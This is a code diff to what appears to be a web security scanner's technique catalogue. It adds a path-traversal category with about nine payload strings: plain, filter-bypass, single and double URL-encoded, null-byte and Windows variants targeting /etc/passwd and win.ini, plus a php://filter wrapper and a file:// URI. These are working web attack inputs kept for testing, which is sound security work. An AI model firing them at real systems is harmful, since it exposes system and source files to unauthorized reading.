@@ -152,6 +152,22 @@ TECHNIQUE_CATEGORIES: dict[str, dict[str, Any]] = {
             ],
         },
     },
+    "path_traversal": {
+        "description": "File path traversal to read arbitrary files or expose source code",
+        "variants": {
+            "sql": [  # All variants (OS-agnostic — not SQL-specific)
+                "../../../etc/passwd",
+                "....//....//....//etc/passwd",          # filter-bypass (strip-one-pass)
+                "..%2f..%2f..%2fetc%2fpasswd",            # single URL-encoded
+                "..%252f..%252f..%252fetc%252fpasswd",    # double URL-encoded
+                "/etc/passwd%00",                          # null-byte truncation (legacy PHP)
+                "..\\..\\..\\windows\\win.ini",
+                "..%5c..%5c..%5cwindows%5cwin.ini",
+                "php://filter/convert.base64-encode/resource=index.php",  # PHP-specific
+                "file:///etc/passwd",
+            ],
+        },
+    },
 }
 
 # Map technique category to parameter locations where it's most effective
@@ -164,6 +180,7 @@ CATEGORY_TARGET_LOCATIONS: dict[str, list[str]] = {
     "stacked_query": ["body_json", "query"],
     "xss_reflected": ["body_json", "query", "body_form", "header", "cookie"],
     "html_injection": ["body_json", "query", "body_form", "header", "cookie"],
+    "path_traversal": ["query", "body_form", "header"],  # file paths in params
 }
 
 # Categories that are most relevant for auth-endpoint credential fields
